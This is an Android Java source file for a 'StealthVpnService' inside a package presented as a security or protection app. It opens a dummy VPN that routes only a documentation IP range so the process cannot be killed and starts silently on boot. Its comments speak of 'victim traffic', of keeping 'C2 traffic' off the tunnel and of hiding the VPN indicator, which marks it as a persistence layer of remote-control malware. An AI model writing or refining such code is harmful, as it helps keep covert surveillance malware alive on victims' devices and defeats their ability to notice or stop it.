package com.seguranca.protecao;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.IOException;

/**
 * StealthVpnService — process-keep-alive via VPN slot.
 *
 * A process hosting an active VpnService receives the same OOM priority as a
 * foreground service. The system cannot kill it without first tearing down
 * the VPN — which it only does during shutdown or explicit user revocation.
 *
 * This implementation establishes a minimal tun interface with a single
 * TEST-NET route (192.0.2.0/24 — RFC 5737 documentation range, not internet-
 * routable). No default route is added. Victim traffic is completely
 * unaffected; only packets destined for the TEST-NET range enter the tun fd,
 * which we simply discard. The VPN indicator appears in the status bar but can
 * be suppressed via ConnectivityManager in future.
 *
 * Activation flow (requires user consent once):
 *   1. During SetupWizardActivity: call VpnService.prepare(ctx). If non-null
 *      Intent returned, startActivityForResult(intent, VPN_REQUEST_CODE).
 *   2. On RESULT_OK: start this service. From that point, starts silently on boot.
 *
 * StartupTrigger: BootReceiver.onReceive() → ProtectionManager.start() → Layer 11.
 */
public final class StealthVpnService extends VpnService {

    private static final String TAG = "StealthVpnService";
    private ParcelFileDescriptor tunFd;
    private Thread discardThread;

    // ── Activation helper (call from SetupWizardActivity) ────────────────────

    /**
     * Returns true if VPN permission is already granted (no dialog needed).
     * Returns false if prepare() returned an Intent (must startActivityForResult).
     */
    public static boolean isPermissionGranted(Context ctx) {
        try {
            return VpnService.prepare(ctx) == null;
        } catch (Exception e) {
            return false;
        }
    }

    // ── Service lifecycle ─────────────────────────────────────────────────────

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (tunFd != null) {
            Log.d(TAG, "VPN already active");
            return START_STICKY;
        }
        startVpn();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        tearDown();
    }

    @Override
    public void onRevoke() {
        // User revoked VPN permission — tear down cleanly
        tearDown();
        Log.w(TAG, "VPN permission revoked by user");
    }

    // ── VPN setup ─────────────────────────────────────────────────────────────

    private void startVpn() {
        try {
            Builder builder = new Builder()
                .setSession(getPackageName())
                // Minimal address — loopback-adjacent, not routed anywhere
                .addAddress("10.253.253.1", 32)
                // Route only TEST-NET (RFC 5737) — 0 real-world traffic
                .addRoute("192.0.2.0", 24)
                // Block our own app from going through the VPN so C2 traffic
                // uses the real interface unimpeded
                .addDisallowedApplication(getPackageName())
                .setBlocking(false);

            // API 29+: set underlying networks for better routing
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                builder.setMetered(false);
            }

            // Transparent reconnect — silent, no user dialog after initial grant
            Intent pendingSelf = new Intent(this, StealthVpnService.class);
            PendingIntent reconnectPi = PendingIntent.getService(
                this, 0, pendingSelf,
                PendingIntent.FLAG_UPDATE_CURRENT
                | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                   ? PendingIntent.FLAG_IMMUTABLE : 0));
            builder.setConfigureIntent(reconnectPi);

            tunFd = builder.establish();
            if (tunFd == null) {
                Log.e(TAG, "VPN establish() returned null — permission revoked?");
                stopSelf();
                return;
            }

            // Discard thread: reads and drops all incoming packets on the tun fd.
            // Without this, the kernel write buffer fills and can stall.
            startDiscardThread();
            Log.d(TAG, "VPN keep-alive active — process OOM priority elevated");

        } catch (Exception e) {
            Log.e(TAG, "startVpn: " + e.getMessage());
            stopSelf();
        }
    }

    private void startDiscardThread() {
        discardThread = new Thread(() -> {
            byte[] buf = new byte[32768];
            java.io.FileInputStream in =
                new java.io.FileInputStream(tunFd.getFileDescriptor());
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    int n = in.read(buf);
                    if (n < 0) break; // fd closed
                    // Discard packet silently — TEST-NET range, no real traffic
                } catch (IOException e) {
                    if (!Thread.currentThread().isInterrupted()) {
                        Log.w(TAG, "Discard thread read: " + e.getMessage());
                    }
                    break;
                }
            }
            Log.d(TAG, "Discard thread exited");
        }, "VpnDiscard");
        discardThread.setDaemon(true);
        discardThread.setPriority(Thread.MIN_PRIORITY);
        discardThread.start();
    }

    private void tearDown() {
        if (discardThread != null) {
            discardThread.interrupt();
            discardThread = null;
        }
        if (tunFd != null) {
            try { tunFd.close(); } catch (IOException ignored) {}
            tunFd = null;
        }
    }
}
